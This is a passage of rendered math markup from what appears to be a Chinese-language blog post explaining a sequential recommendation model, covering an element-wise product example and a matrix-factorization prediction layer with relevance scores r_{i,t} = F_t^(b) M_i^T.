class=\"mord\"><span class=\"mord\">2</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">3</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">6</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">)</span></span></span></span></span><span style=\"top:-3.6000149999999995em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">7</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mord\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">8</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">9</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mord\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">)</span></span></span></span></span><span style=\"top:-1.5099849999999995em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">它们的元素向乘积</span><span class=\"mord\"> C </span><span class=\"mord cjk_fallback\">为</span><span class=\"mord\">:</span></span></span></span><span style=\"top:0.6000150000000004em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">A</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">7</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">8</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mord\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">3</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">9</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">1</span><span class=\"mord\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">)</span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">7</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">4</span><span class=\"mord\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mord\">6</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">5</span><span class=\"mord\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"mord\">7</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">7</span><span class=\"mord\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">)</span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.300045000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h3 id=\"预测层\"><a class=\"anchor\" href=\"#预测层\">#</a> 预测层</h3>\n<p>在 b 个自我关注快后根据<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>F</mi><mi>t</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup></mrow><annotation encoding=\"application/x-tex\">F_{t}^{(b)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.2905559999999998em;vertical-align:-0.24575599999999992em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.454244em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span style=\"top:-3.2197999999999998em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24575599999999992em;\"><span></span></span></span></span></span></span></span></span></span> 来预测下一个项目。具体来说采用 MF 层来预测项目<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 的相关性。</p>\n<ul>\n<li>\n<p>MF 层（Matrix Factorization Layer，矩阵分解层）在推荐系统中是指一种使用矩阵分解技术来预测用户与物品之间的交互评分或相关性的方法。矩阵分解是一种常见的协同过滤技术，通过将用户 - 物品评分矩阵分解为两个低维矩阵来建模用户偏好和物品特征</p>\n</li>\n<li>\n<p>矩阵分解的目标是将一个大矩阵分解为两个更小的矩阵，这两个矩阵的乘积近似于原始矩阵。在推荐系统中，通常有一个用户 - 物品评分矩阵 R，其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">R_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 表示用户 i 对物品 j 的评分。矩阵分解的目的是将 R 分解为两个地位矩阵 U 和 V。</p>\n</li>\n<li>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>R</mi><mo>≈</mo><mi>U</mi><msup><mi>V</mi><mi>T</mi></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>其中:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>∙</mo><mspace width=\"1em\"/><mi>U</mi><mtext> 是用户矩阵,维度为 </mtext><mi>m</mi><mo>×</mo><mi>k</mi><mtext>,每一行对应一个用户的隐向量表示。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>∙</mo><mspace width=\"1em\"/><mi>V</mi><mtext> 是物品矩阵,维度为 </mtext><mi>n</mi><mo>×</mo><mi>k</mi><mtext>,每一行对应一个物品的隐向量表示。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>∙</mo><mspace width=\"1em\"/><mi>k</mi><mtext> 是隐向量的维度,也称为潜在特征的数量。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}&amp;R\\approx UV^T\\\\&amp;\\text{其中:}\\\\&amp;\\bullet\\quad U\\text{ 是用户矩阵,维度为 }m\\times k\\text{,每一行对应一个用户的隐向量表示。}\\\\&amp;\\bullet\\quad V\\text{ 是物品矩阵,维度为 }n\\times k\\text{,每一行对应一个物品的隐向量表示。}\\\\&amp;\\bullet\\quad k\\text{ 是隐向量的维度,也称为潜在特征的数量。}\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:7.551331em;vertical-align:-3.5256654999999997em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.025665500000001em;\"><span style=\"top:-6.025665500000001em;\"><span class=\"pstrut\" style=\"height:2.891331em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.525665500000001em;\"><span class=\"pstrut\" style=\"height:2.891331em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.0256655000000006em;\"><span class=\"pstrut\" style=\"height:2.891331em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.5256655000000006em;\"><span class=\"pstrut\" style=\"height:2.891331em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.025665500000000563em;\"><span class=\"pstrut\" style=\"height:2.891331em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5256654999999997em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:4.025665500000001em;\"><span style=\"top:-6.1343345000000005em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span><span style=\"top:-4.6343345000000005em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">其中</span><span class=\"mord\">:</span></span></span></span><span style=\"top:-3.1343345000000005em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∙</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">是用户矩阵</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">维度为</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord text\"><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">每一行对应一个用户的隐向量表示。</span></span></span></span><span style=\"top:-1.6343345000000005em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∙</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">是物品矩阵</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">维度为</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord text\"><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">每一行对应一个物品的隐向量表示。</span></span></span></span><span style=\"top:-0.13433450000000047em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∙</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">是隐向量的维度</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">也称为潜在特征的数量。</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5256654999999997em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n</li>\n<li></li>\n</ul>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>r</mi><mrow><mi>i</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo>=</mo><msubsup><mi mathvariant=\"bold\">F</mi><mi>t</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup><msubsup><mi mathvariant=\"bold\">N</mi><mi>i</mi><mi>T</mi></msubsup><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">r_{i,t}=\\mathbf{F}_t^{(b)}\\mathbf{N}_i^T,\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2917999999999998em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.454244em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span><span style=\"top:-3.2198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.24575599999999997em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">N</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-2.4530000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.247em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>r</mi><mrow><mi>i</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">r_{i,t}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">t</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 是物品 i 在时间步 t 被推荐的相关性分数。</li>\n<li>$F_t $ 是用户在时间步 t 的隐向量表示。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>N</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">N_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是物品 i 的隐向量表示。</li>\n</ul>\n<p>在这里我们使用单项嵌入 M 的方案，即</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>r</mi><mrow><mi>i</mi><mo separator=\"true\">,</mo><mi>t</mi></mrow></msub><mo>=</mo><msubsup><mi mathvariant=\"bold\">F</mi><mi>t</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup><msubsup><mi mathvariant=\"bold\">M</mi><mi>i</mi><mi>T</mi></msubsup></mrow><annotation encoding=\"application/x-tex\">r_{i,t}=\\mathbf{F}_{t}^{(b)}\\mathbf{M}_{i}^{T}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.716668em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span 